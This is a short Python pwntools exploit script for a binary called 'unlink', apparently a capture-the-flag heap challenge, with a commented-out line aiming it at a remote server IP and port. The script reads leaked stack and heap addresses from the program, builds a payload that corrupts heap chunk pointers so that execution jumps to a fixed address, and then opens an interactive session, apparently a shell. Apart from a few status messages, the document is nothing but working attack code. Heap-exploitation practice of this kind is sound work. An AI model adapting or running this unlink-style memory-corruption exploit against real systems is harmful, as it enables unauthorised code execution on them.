#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./unlink")
        self.p = None

    def start_binary(self):
#        self.p = remote("159.203.149.53", 30007)
        self.p = process("./unlink")

    def pwn_binary(self):
        self.start_binary()

        data = self.p.recvline()
        stack_leak = int(data[-11:-1], 16)
        print "[x] Leak stack address: "+hex(stack_leak)
        data = self.p.recvline()
        heap_leak = int(data[-11:-1], 16)
        print "[x] Leak heap address: "+hex(heap_leak)
        self.p.recvline()

        junk = "A"*4
        payload  = p32(0x0804859b) + junk
        payload += junk * 2
        payload += p32(heap_leak+0xc) + p32(stack_leak+0x14)
        self.p.send(payload)
        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
